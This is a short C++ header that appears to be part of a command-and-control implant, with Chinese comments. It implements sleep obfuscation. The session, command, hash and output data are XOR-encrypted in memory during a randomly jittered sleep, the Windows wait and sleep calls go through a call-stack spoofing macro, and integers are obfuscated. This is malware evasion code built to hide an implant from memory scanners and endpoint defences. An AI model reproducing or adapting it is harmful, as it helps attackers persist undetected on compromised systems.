#pragma once

extern "C" void MySleep(DWORD time) {
    if (hEvent == NULL || SPOOF(WaitForSingleObject, 2, hEvent, time) != WAIT_TIMEOUT) {
        SPOOF(Sleep, 1, time);
    }
}

void Silence() {
    // 堆加密 (不加密长度超过 500 的字符串, 暂时没必要)
    sessionInfo.Xor();
    commandInfo.Xor();
    hashInfo.Xor();
    outputInfo.Xor();

    // 睡眠
    int sleepOffsetMax = OBFINT(1000, "sleepOffsetMaxSIG");
    int time = sleepBase + ((GetRand(1000) / 1000.0) * 2 - 1) * sleepOffsetMax;
    if (time <= 0) {
        time = 1000;
    }
    MySleep(time);

    // 堆解密
    sessionInfo.Xor();
    commandInfo.Xor();
    hashInfo.Xor();
    outputInfo.Xor();
}